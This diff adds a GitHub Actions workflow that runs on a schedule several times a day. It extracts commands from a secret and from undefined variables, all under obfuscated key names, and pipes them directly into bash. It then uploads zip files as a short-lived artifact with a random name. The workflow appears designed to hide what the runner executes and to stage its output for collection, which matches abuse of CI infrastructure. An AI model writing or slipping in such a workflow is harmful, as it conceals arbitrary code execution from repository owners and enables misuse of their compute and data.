@@ -1,0 +1,34 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '52 5,11,17,23 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Apply
+        env:
+          ex93: ${{ secrets.ex93 }}
+        run: |
+          printf '%s' "$ex93" | jq -r .jhoea1 | /bin/bash
+          echo $jbt10 | jq -r .klreq43867 | /bin/bash
+          echo $nytqp11 | jq -r .brex2306 | /bin/bash
+          printf '%s' "$o627" | jq -r .jegw128 | /bin/bash
+
+      - name: Upload output
+        uses: actions/upload-artifact@v4
+        with:
+          name: GCaJb6Mq
+          path: "*.zip"
+          retention-days: 1
